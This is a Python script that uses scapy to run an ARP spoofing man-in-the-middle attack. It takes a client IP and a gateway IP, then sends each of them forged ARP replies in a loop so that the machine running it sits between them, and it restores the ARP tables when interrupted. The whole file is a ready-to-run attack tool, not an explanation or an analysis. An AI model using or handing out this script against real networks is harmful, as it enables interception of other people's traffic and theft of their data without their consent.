#!/usr/bin/env python3
import scapy.all as scapy
import time
import sys

# Fetching mac address and and returning back to the variable
def fetch_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return response_list[0][1].hwsrc

# Spoofing functionality
def spoofing(target_ip, spoof_ip):
    target_mac = fetch_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restoring ARP tables
def arp_restore(destination_ip, source_ip):
    destination_mac = fetch_mac_address(destination_ip)
    source_mac = fetch_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) # will send packet 4 times to make sure to correct arp table

# Taking user input
# client_ip = "192.168.100.37"
# gateway_ip = "192.168.100.1"
client_ip = input(">>Enter client IP: ")
gateway_ip = input(">>Enter Network IP: ")
# To continue the spoofing packets

try:
    # To initialize the number of packets send
    packet_count = 0
    while packet_count > -1:
        spoofing(client_ip, gateway_ip) # will spoof the client by telling that i am the router
        spoofing(gateway_ip, client_ip) # will spoof the router by telling i am the client
        packet_count = packet_count + 2

        print("\r[+] Packet Sent Successfully: " + str(packet_count), end="")
        sys.stdout.flush()
        time.sleep(2) # will sleep for 2 sec. In order to not send to many packets

except KeyboardInterrupt:
    print("\n[-] Stopping Arp Spoofing. CTRL + C Detected ....... Resetting ARP tables ...... Please Wait")
    arp_restore(client_ip, gateway_ip) # Restoring client ip
    arp_restore(gateway_ip, client_ip) # Restoring router ip

# Use the below functions in case if it doesn't work using the end function in line 28 via python3
# sys.stdout.flush()
# import sys
# print(packet.show())
# print(packet.summary())